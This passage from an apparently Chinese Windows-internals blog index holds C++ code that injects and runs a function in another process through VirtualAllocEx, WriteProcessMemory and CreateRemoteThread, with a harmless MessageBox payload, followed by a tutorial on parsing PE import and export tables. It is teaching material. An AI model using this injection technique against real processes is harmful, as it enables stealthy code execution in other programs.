FARPROC dwLoadLibrary;</span><br><span class="line">    FARPROC dwGetProcAddress;</span><br><span class="line">    FARPROC dwGetModuleHandle;</span><br><span class="line">    FARPROC dwGetModuleFileName;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> User32Dll[STRLEN];</span><br><span class="line">    <span class="type">char</span> MessageBox[STRLEN];</span><br><span class="line">    <span class="type">char</span> Str[STRLEN];</span><br><span class="line">&#125;DATA, *PDATA;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">RemoteThreadProc</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PDATA pData = (PDATA)lpParam;</span><br><span class="line">    <span class="comment">// 定义API函数原型</span></span><br><span class="line">    <span class="built_in">HMODULE</span>(__stdcall * MyLoadLibrary)(LPCTSTR);</span><br><span class="line">    <span class="built_in">FARPROC</span>(__stdcall * MyGetProcAddress)(HMODULE, LPCSTR);</span><br><span class="line">    <span class="built_in">HMODULE</span>(__stdcall * MyGetModuelHandle)(LPCTSTR);</span><br><span class="line">    <span class="built_in">int</span>(__stdcall * MyMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT);</span><br><span class="line">    <span class="built_in">DWORD</span>(__stdcall * MyGetModuleFileName)(HMODULE, LPTSTR, DWORD);</span><br><span class="line">    <span class="comment">// 对各函数地址进行赋值</span></span><br><span class="line">    MyLoadLibrary = (<span class="built_in">HMODULE</span>(__stdcall*)(LPCTSTR))pData-&gt;dwLoadLibrary;</span><br><span class="line">    MyGetProcAddress = (<span class="built_in">FARPROC</span>(__stdcall*)(HMODULE, LPCSTR))pData-&gt;dwGetProcAddress;</span><br><span class="line">    MyGetModuelHandle = (<span class="built_in">HMODULE</span>(__stdcall*)(LPCTSTR))pData-&gt;dwGetModuleHandle;</span><br><span class="line">    MyGetModuleFileName = (<span class="built_in">DWORD</span>(__stdcall*)(HMODULE, LPTSTR, DWORD))pData-&gt;dwGetModuleFileName;</span><br><span class="line">    <span class="comment">// 加载user32.dll</span></span><br><span class="line">    HMODULE hModule = <span class="built_in">MyLoadLibrary</span>((LPCTSTR)pData-&gt;User32Dll);</span><br><span class="line">    MyMessageBox = (<span class="built_in">int</span>(__stdcall*)(HWND, LPCTSTR, LPCTSTR, UINT))<span class="built_in">MyGetProcAddress</span>(hModule, pData-&gt;MessageBox);</span><br><span class="line">    <span class="type">char</span> szModuleFileName[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">MyGetModuleFileName</span>(hModule, (LPTSTR)szModuleFileName, MAX_PATH);</span><br><span class="line">    <span class="built_in">MyMessageBox</span>(<span class="literal">NULL</span>, (LPCTSTR)pData-&gt;Str, (LPCTSTR)szModuleFileName, MB_OK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">noDllInjectCode</span><span class="params">(DWORD dwPid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 打开进程获取进程句柄</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcess Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DATA Data = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">// 获取kernel32.dll中相关的导出函数</span></span><br><span class="line">    Data.dwLoadLibrary = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;Kernel32.dll&quot;</span>)), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    Data.dwGetProcAddress = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;Kernel32.dll&quot;</span>)), <span class="string">&quot;GetProcAddress&quot;</span>);</span><br><span class="line">    Data.dwGetModuleHandle = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;Kernel32.dll&quot;</span>)), <span class="string">&quot;GetModuleHandleA&quot;</span>);</span><br><span class="line">    Data.dwGetModuleFileName = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;Kernel32.dll&quot;</span>)), <span class="string">&quot;GetModuleFileNameA&quot;</span>);</span><br><span class="line">    <span class="comment">// 需要其他DLL和导出函数</span></span><br><span class="line">    <span class="built_in">lstrcpy</span>((LPSTR)Data.User32Dll, <span class="built_in">TEXT</span>(<span class="string">&quot;user32.dll&quot;</span>));</span><br><span class="line">    <span class="built_in">lstrcpy</span>((LPSTR)Data.MessageBox, <span class="built_in">TEXT</span>(<span class="string">&quot;MessageBoxA&quot;</span>));</span><br><span class="line">    <span class="built_in">lstrcpy</span>((LPSTR)Data.Str, <span class="built_in">TEXT</span>(<span class="string">&quot;Dokey Inject Code&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在目标进程申请内存空间</span></span><br><span class="line">    LPVOID lpData = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(Data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (lpData == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx1 Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将数据写入目标内存中</span></span><br><span class="line">    SIZE_T dwWriteLen = <span class="number">0</span>;</span><br><span class="line">    BOOL bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, lpData, &amp;Data, <span class="built_in">sizeof</span>(Data), &amp;dwWriteLen);</span><br><span class="line">    <span class="keyword">if</span> (bRet == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 在目标进程申请内存用于保存代码长度</span></span><br><span class="line">    DWORD dwFunction = <span class="number">0x4000</span>;</span><br><span class="line">    LPVOID lpCode = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwFunction, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (lpCode == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx2 Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    bRet = <span class="built_in">WriteProcessMemory</span>(hProcess, lpCode, &amp;RemoteThreadProc, dwFunction, &amp;dwWriteLen);</span><br><span class="line">    <span class="keyword">if</span> (bRet == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpCode, lpData, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hThread == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateRemoteThread Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">noDllInjectCode</span>(<span class="number">3076</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows Inject </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据目录表解析</title>
      <link href="/9180d97d.html"/>
      <url>/9180d97d.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>基础知识</strong></p><ul><li>基地址(ImageBase): 当PE文件通过Windows加载器载入内存后，内存中的版本称为模块，映射文件的起始地址称为模块句柄，可通过句柄访问内存中其他数据结构，这个内存起始地址称为基地址。</li><li>虚拟地址(VA): 在Windows系统中，PE文件被系统加载到内存后，每个程序都有自己的虚拟空间，这个虚拟空间的内存地址称为虚拟地址。</li><li>相对虚拟地址(RVA): 可执行文件中，有许多地方需要指定内存中的地址。例如，应用全局变量时需要指定它的地址。为了避免在PE文件中出现绝对内存地址引入了相对虚拟地址，它就是在内存中相对于PE文件载入地址的偏移量。</li><li>文件偏移地址(FOA): 当PE文件存储在磁盘中时，某个数据的位置相对于文件头的偏移量称为文件偏移地址(FOA)。文件偏移地址从PE文件中的第一个字节开始计数，起始值为0。</li></ul><p>它们之间的关系：虚拟地址(VA) &#x3D; 基地址(ImageBase) + 相对虚拟地址(RVA)</p></div><span id="more"></span><h2 id="数据目录表结构"><a href="#数据目录表结构" class="headerlink" title="数据目录表结构"></a>数据目录表结构</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DATA_DIRECTORY</span> &#123;</span><br><span class="line">    DWORD   VirtualAddress;     <span class="comment">// 虚拟地址，就是数据目录表的起始位置</span></span><br><span class="line">    DWORD   Size;               <span class="comment">// 尺寸，起始地址 + 尺寸 = 结束的位置</span></span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><h3 id="Directory-Entries"><a href="#Directory-Entries" class="headerlink" title="Directory Entries"></a>Directory Entries</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT          0   <span class="comment">// Export Directory       导出表</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT          1   <span class="comment">// Import Directory       导入表</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE        2   <span class="comment">// Resource Directory     资源表</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   <span class="comment">// Exception Directory    异常</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY        4   <span class="comment">// Security Directory     安全</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC       5   <span class="comment">// Base Relocation Table  重定位表</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG           6   <span class="comment">// Debug Directory        调试信息</span></span></span><br><span class="line"><span class="comment">//      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   <span class="comment">// Architecture Specific Data 版权信息</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   <span class="comment">// RVA of GP</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS             9   <span class="comment">// TLS Directory  TLS表</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   <span class="comment">// Load Configuration Directory   </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   <span class="comment">// Bound Import Directory in headers</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            12   <span class="comment">// Import Address Table 导入函数地址表</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   <span class="comment">// Delay Load Import Descriptors</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   <span class="comment">// COM Runtime descriptor</span></span></span><br></pre></td></tr></table></figure><h2 id="地址函数转换"><a href="#地址函数转换" class="headerlink" title="地址函数转换"></a>地址函数转换</h2><div class="note info"><p><strong>与PE结构有关的三种地址</strong></p><p><code>VA(虚拟地址)</code>：PE文件映射到内存后的地址<br><code>RVA(相对虚拟地址)</code>：内存地址相对于映射基地址的偏移地址<br><code>FileOffset(文件偏移地址)</code>：相对PE文件在磁盘上的文件开头的偏移地址</p><ul><li>FOA &#x3D; RVA - H</li><li>FOA &#x3D; VA - ImageBase - H</li></ul></div><hr><ol><li><p>判断RVA是否在头部<br> FOA &#x3D; RVA</p></li><li><p>判断RVA位于哪个节<br> RVA &gt;&#x3D; Section[i]-&gt;VirtualAddress<br> RVA &lt;&#x3D; Section[i]-&gt;VirtualAddress + 当前节内存对齐后的大小</p><p> FOA &#x3D; RVA - Section[i]-&gt;VirtualAddress + Section[i]-&gt;PointerToRawData</p></li></ol><h3 id="转换函数代码"><a href="#转换函数代码" class="headerlink" title="转换函数代码"></a>转换函数代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">RVAToFOA</span><span class="params">(DWORD dwRVA, <span class="type">char</span>* buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// dwRVA 相对虚拟函数 buffer 已加载的文件内存映像</span></span><br><span class="line">    <span class="comment">// DOS头</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line">    <span class="comment">// NT 头</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);</span><br><span class="line">    <span class="comment">// 区段</span></span><br><span class="line">    PIMAGE_SECTION_HEADER pSectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNtHeader);</span><br><span class="line">    <span class="comment">// 判断是否落在头部</span></span><br><span class="line">    <span class="keyword">if</span>(dwRVA &lt; pSectionHeader[<span class="number">0</span>].VirtualAddress)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> dwRVA;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNtHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 判断落在哪个区段</span></span><br><span class="line">        <span class="keyword">if</span>(dwRVA &gt;= pSectionHeader[i].VirtualAddress &amp;&amp; dwRVA &lt;= pSectionHeader[i].VirtualAddress + pSectionHeader[i].Misc.VirtualSize)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> dwRVA - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dwRVA;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IMAGE-IMPORT-DESCRIPTOR-导入表"><a href="#IMAGE-IMPORT-DESCRIPTOR-导入表" class="headerlink" title="_IMAGE_IMPORT_DESCRIPTOR(导入表)"></a>_IMAGE_IMPORT_DESCRIPTOR(导入表)</h2><h3 id="IMAGE-IMPORT-DESCRIPTOR结构体"><a href="#IMAGE-IMPORT-DESCRIPTOR结构体" class="headerlink" title="IMAGE_IMPORT_DESCRIPTOR结构体"></a>IMAGE_IMPORT_DESCRIPTOR结构体</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><div class="note message"><p><strong>IMAGE_IMPORT_DESCRIPTOR</strong></p><ul><li><code>OriginalFirstThunk</code>: 该字段指向导入名称表（INT）的RVA，该RVA指向的是一个<code>IMAGE_THUNK_DATA</code>的结构体</li><li><code>TimeDateStamp</code>: 该字段可以被忽略，一般为0即可</li><li><code>ForwarderChain</code>: 该字段一般为0</li><li><code>Name</code>: 该字段指向DLL名称的RVA地址</li><li><code>FirstThunk</code>: 该字段包含导入地址表（IAT）的RVA，IAT是一个<code>IMAGE_THUNK_DATA</code>的结构体数组</li></ul></div><h3 id="IMAGE-THUNK-DATA结构体"><a href="#IMAGE-THUNK-DATA结构体" class="headerlink" title="IMAGE_THUNK_DATA结构体"></a>IMAGE_THUNK_DATA结构体</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_THUNK_DATA32</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD ForwarderString;      <span class="comment">// PBYTE </span></span><br><span class="line">        DWORD Function;             <span class="comment">// PDWORD</span></span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        DWORD AddressOfData;        <span class="comment">// PIMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure><div class="note message"><p><strong>IMAGE_THUNK_DATA</strong></p><ul><li><code>ForwarderString</code>: 是转向它的第一个索引的函数的名称的RVA</li><li><code>Function</code>: 代表输入函数的地址</li><li><code>Ordinal</code>: 代表该函数在导入DLL中的序号。只有当<code>IMAGE_THUNK_DATA</code>的最高位为1时才代表使用序号导入，此时低31位代表在导入DLL中该函数的序号</li><li><code>AddressOfData</code>: 指向<code>IMAGE_IMPORT_BY_NAME</code>的一个指针，它表示用函数名进行导入。当<code>IMAGE_THUNK_DATA</code>的最高位为0时代表使用函数名进行导入，此时这四个字节代表着<code>IMAGE_IMPORY_BY_NAME</code>的RVA</li></ul><hr><ol><li>每一个<code>IMAGE_THUNK_DATA</code>对应一个DLL中的导入函数。<code>IMAGE_THUNK_DATA</code>与<code>IMAGE_IMPORT_DESCRIPORT</code>类似，同样是一个以全”0”的<code>IMAGE_THUNK_DATA</code>为结束</li><li>当<code>IMAGE_THUNK_DATA</code>值的最高位为1时，表示函数以序号方式导入，这时低31位被看作一个导入序号。当其最高位为0时；表示函数以函数名称字符串的方式导入，这时DWORD的值表示一个RVA，并指向一个<code>IMAGE_IMPORT_BY_NAME</code>结构体</li></ol></div><h3 id="IMAGE-IMPORT-BY-NAME结构体"><a href="#IMAGE-IMPORT-BY-NAME结构体" class="headerlink" title="IMAGE_IMPORT_BY_NAME结构体"></a>IMAGE_IMPORT_BY_NAME结构体</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_BY_NAME</span> &#123;</span><br><span class="line">    WORD    Hint;</span><br><span class="line">    CHAR   Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><div class="note message"><p><strong>IMAGE_IMPORT_BY_NAME</strong></p><ul><li><code>Hint</code>: 该字段表示该函数在其导入表中的序号</li><li><code>Name</code>: 该字段表示导入函数的函数名。导入函数是一个以ASCII编码的字符串，并以NULL结尾。在<code>IMAGE_IMPORT_BY_NAME</code>中使用Name[1]来定义该字段，表示这是只有1个长度大小的字符串，但是函数名不可能只有一个字节的长度，通过越界访问来达到访问变长字符串的功能</li></ul></div><div class="note warning"><p><strong>注意</strong></p><ol><li><code>IMAGE_IMPORT_DESCRIPTOR</code>结构体中的<code>OriginalFirstThunk</code>和<code>FirstThunk</code>都指向了<code>IMAGE_THUNK_DATA</code>这个结构体，但是两者是有区别的。当文件在磁盘上时，两者指向的<code>IMAGE_THUNK_DATA</code>是相同的内容，而当文件被载入内存后，两者指向的就是不同的内容</li><li>在磁盘上时，<code>OriginalFirstThunk</code>指向的<code>IMAGE_THUNK_DATA</code>中保存的是指向函数名的RVA，称其为INT。<code>FirstThunk</code>通常指向的<code>IMAGE_THUNK_DATA</code>中保存的也是指向函数名的RVA，它们在磁盘上是没有差异的</li><li>当文件被载入内存后，<code>OriginalFirstThunk</code>指向的<code>IMAGE_THUNK_DATA</code>中保存的是指向函数名的RVA；<code>FirstThunk</code>通常指向的<code>IMAGE_THUNK_DATA</code>中由装载器填充的导入函数地址，称其为IAT。</li></ol></div><h3 id="解析导入表代码"><a href="#解析导入表代码" class="headerlink" title="解析导入表代码"></a>解析导入表代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">PrintImportTable</span><span class="params">(<span class="type">char</span>* buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// DOS 头</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line">    <span class="comment">// NT 头</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);</span><br><span class="line">    <span class="comment">// 定位导入表</span></span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_IMPORT);</span><br><span class="line">    <span class="comment">// 填充结构体</span></span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(<span class="built_in">RVAToFOV</span>(pData.Dir.VirtualAddress, buffer) + buffer);</span><br><span class="line">    <span class="keyword">while</span>(pImport-&gt;Name)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span>* szDllName = (<span class="type">char</span>*)(<span class="built_in">RVAToFOA</span>(pImport-&gt;Name, buffer) + buffer);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DllName: %s\n&quot;</span>, szDllName);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;TimeDateStamp：%08x\n&quot;</span>, pImport-&gt;TimeDateStamp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ForwarderChain：%08x\n&quot;</span>, pImport-&gt;ForwarderChain);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name Offset：%08x\n&quot;</span>, pImport-&gt;Name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;FirstThunk：%08x\n&quot;</span>, pImport-&gt;FirstThunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OriginalFirstThunk：%08x\n\n&quot;</span>, pImport-&gt;OriginalFirstThunk);</span><br><span class="line"></span><br><span class="line">        PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(<span class="built_in">RVAToFOA</span>(pImport-&gt;FirstThunk, buffer) + buffer);</span><br><span class="line">        <span class="keyword">while</span>(pIAT-&gt;u1.Ordinal != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">IMAGE_SNAP_BY_ORDINAL32</span>(pIAT-&gt;u1.Ordinal))</span><br><span class="line">            &#123;</span><br><span class="line">                PIMAGE_IMPORT_BY_NAME pFunctionName = (PIMAGE_IMPORT_BY_NAME)(<span class="built_in">RVAToFOA</span>(pIAT-&gt;u1.AddressOfData, buffer) + buffer);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Function Name: %s\n&quot;</span>, pFunctionName);</span><br><span class="line">            &#125;</span><br><span class="line">            pIAT++;</span><br><span class="line">        &#125;</span><br><span class="line">        pImport++</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IMAGE-EXPORT-DIRECTORY-导出表"><a href="#IMAGE-EXPORT-DIRECTORY-导出表" class="headerlink" title="_IMAGE_EXPORT_DIRECTORY(导出表)"></a>_IMAGE_EXPORT_DIRECTORY(导出表)</h2><h3 id="IMAGE-EXPORT-DIRECTORY结构体"><a href="#IMAGE-EXPORT-DIRECTORY结构体" class="headerlink" title="IMAGE_EXPORT_DIRECTORY结构体"></a>IMAGE_EXPORT_DIRECTORY结构体</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 